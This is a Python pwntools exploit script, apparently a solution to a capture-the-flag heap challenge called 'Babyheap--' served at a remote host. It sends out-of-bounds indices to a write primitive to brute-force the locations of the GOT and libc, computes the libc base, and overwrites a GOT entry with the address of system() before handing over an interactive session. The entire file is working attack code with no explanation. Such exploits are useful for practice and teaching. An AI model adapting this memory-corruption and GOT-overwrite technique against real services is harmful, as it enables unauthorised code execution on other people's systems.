#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
l = ELF( 'libc-2.32.so' )

print( f'read    {hex(l.sym.read)}' )
print( f'malloc   {hex(l.sym.malloc)}' )
print( f'write   {hex(l.sym.write)}' )
print( f'atoi     {hex(l.sym.atoi)}' )
print( f'system   {hex(l.sym.system)}' )
print( f'puts     {hex(l.sym.puts)}' )


y = remote( 'eof01.zoolab.org' , 10101 )
#y = process( './share/Babyheap--' )

def write( i , v ):
    y.sendafter( 'entry : ' , str(i) )
    y.sendafter( 'data : ' , p32(v) )

pause()

# 0x1a0//4

got_idx = 0
off = -0x1a0
start = 0x6d0
#start = int(input('got>'), 16)

#got_idx = -(int(input('>'), 16) * 0x1000) + off

for i in range( start , start* 0x1000 ):
    print(hex(off - i * 0x1000))
    y.send( str( (off - i * 0x1000) // 4 ) )
    sleep(0.05)
    y.sendafter( 'data : ' , '\0' * 14 )
    sleep(0.05)
    o = y.recv(0x100)
    #print(o)
    if o.count( b'entry' ) < 2:
        got_idx = (off - i * 0x1000) // 4
        print( hex(off - i * 0x1000) , hex((off - i * 0x1000) // 4) )
        break


success( f'got index -> {hex(got_idx)}' )
y.send( str(got_idx + 0xc) )
y.sendafter( 'data : ' , p32(0x777777) )


libc_idx = 0
off = -0x1a0 + 0x22000
start = 0x9f000
#start = int(input('bss>'), 16)
for i in range( start , start * 0x1000 ):
    print(hex(off + i * 0x1000))
    y.send( str( (off + i * 0x1000) // 4 ) )
    sleep(0.05)
    y.sendafter( 'data : ' , '\0' * 14 )
    sleep(0.05)
    o = y.recv(0x100)
    #print(o)
    if o.count( b'entry' ) < 2:
        libc_idx = (off + i * 0x1000) // 4
        print( hex(off + i * 0x1000) , hex((off + i * 0x1000) // 4) )
        break
    
success( f'libc index -> {hex(libc_idx)}' )
y.send( str(got_idx + 0xc) )
y.sendafter( 'data : ' , p32(0x777777) )


y.sendafter( 'entry : ' , str(got_idx + 0xc) )
y.sendafter( 'data : ' , p32( 0xf7000000 ) )

libc_bss_addr = 0

start = 0
#start = int(input('libc>'), 16)
for i in range( start , start * 0x1000 ):
    print(hex(0xf7000000 + i * 0x1000))
    y.send( str( (i * 0x1000) // 4 ) )
    sleep(0.05)
    y.sendafter( 'data : ' , '\0' * 14 )
    sleep(0.05)
    o = y.recv(0x100)
    #print(o)
    if o.count( b'entry' ) < 2:
        libc_bss_addr = 0xf7000000 + i * 0x1000
        break

l.address = libc_bss_addr - 0x1eb000
success( f'libc -> {hex(l.address)}' )

got_addr = l.address - (libc_idx-got_idx) * 4 + 0x22000 + 0x1e4000
success( f'got_addr -> {hex(got_addr)}' )

y.send( str(got_idx + 0xc) )
y.sendafter( 'data : ' , p32(0x777777) )

write( (got_addr - 0xf7000000) // 4 + 8 , l.sym.system )


'''
libc_idx = 0
off = -0x1a0 + 0x22000
for i in range( 0x9f000 , 0x9f000 * 0x100 ):
    print(hex(off + i * 0x1000))
    y.send( str( (off - i * 0x1000) // 4 ) )
    sleep(0.005)
    y.sendafter( 'data : ' , '\0' * 14 )
    sleep(0.005)
    o = y.recv(0x100)
    #print(o)
    if o.count( b'entry' ) < 2:
        libc_idx = (off - i * 0x1000) // 4
        print( hex(off - i * 0x1000) , hex((off - i * 0x1000) // 4) )
        break
    
success( f'libc index -> {hex(libc_idx)}' )
'''


'''
0x1eb000

0xa098b000
0xa1475000
0x9fcb9000
0x9fe39000
'''



y.interactive()